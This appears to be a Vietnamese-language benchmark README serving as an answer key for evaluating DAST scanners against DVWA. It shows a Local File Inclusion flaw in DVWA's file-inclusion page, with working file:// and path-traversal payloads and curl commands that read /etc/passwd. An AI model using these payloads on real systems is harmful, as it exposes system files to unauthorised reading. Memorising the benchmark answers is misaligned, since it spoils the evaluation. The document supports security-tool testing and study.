# DV-baseline

Tài liệu này (**"DV-Baseline"**) được xây dựng nhằm mục đích thiết lập một **"Ground Truth" (Sự thật nền)** chi tiết, có thể kiểm chứng và định lượng được cho ứng dụng Damn Vulnerable Web Application (DVWA).

Mục tiêu chính là cung cấp một bộ dữ liệu tham chiếu (*benchmark dataset*) chuẩn hóa để đo lường, so sánh và xác thực hiệu suất của các công cụ quét bảo mật ứng dụng động (DAST) và các giải pháp phân tích bảo mật tự động khác.  
Tài liệu này đóng vai trò là **"bảng đáp án"** để đánh giá:

- **Độ phủ (Coverage):** Khả năng phát hiện các lỗ hổng ở các mức độ phức tạp khác nhau (*Low, Medium, High*).

- **Độ chính xác (Accuracy):** Khả năng phân biệt giữa lỗ hổng thực sự (*True Positive*) và các báo động giả (*False Positive*) bằng cách phân tích cấp độ *"Impossible"*.  

- **Độ sâu (Depth):** Khả năng vượt qua (*bypass*) các cơ chế phòng vệ (*filter*) cơ bản và nâng cao của công cụ.

# Local File Inclusion (LFI) - (OWASP A03:2021 - Injection)
## Method
Phân tích mã nguồn cho thấy một cơ chế `Whitelist (fnmatch("file*", ... ))` đã được triển khai nhưng bị lỗi, cho phép dữ liệu do người dùng kiểm soát đi vào hàm `include()` dẫn tới LFI.

## Vulnerable Code 
### vulnerabilities/fi/index.php

```
if( !fnmatch( "file*", $file ) && $file != "include.php" ) { ...
```
Hàm fnmatch() với pattern "file*" (bất cứ thứ gì bắt đầu bằng "file"). Nó không chỉ khớp với 'file1.php', mà nó còn khớp với:
-   PHP Wrapper: 'file:///etc/passwd'
-   Path Traversal: 'file/../../../../../../etc/passwd'
## Proof of Value - PoV
### Kịch bản 1: Đọc tệp tin hệ thống qua PHP Wrapper
* Tác động: Lộ lọt dữ liệu nhạy cảm.
* Payload: 
```
file:///etc/passwd
```
* Ví dụ (cURL):
```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'page=file:///etc/passwd'
```
* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**

### Kịch bản 2: Đọc tệp tin hệ thống qua Path Traversal
* Tác động: Lộ lọt dữ liệu nhạy cảm.
* Payload: 
```
file/../../../../../../etc/passwd
```
* Ví dụ (cURL):
```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'page=file/../../../../../../etc/passwd'
```
* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**

### Screenshots

<img width="2027" height="1291" alt="image" src="https://github.com/user-attachments/assets/05e2c76f-822b-4a9b-883e-c03d1673de11" />
<img width="2029" height="1338" alt="image" src="https://github.com/user-attachments/assets/026e60e3-6cc3-430e-ad90-a7f6754199c3" />

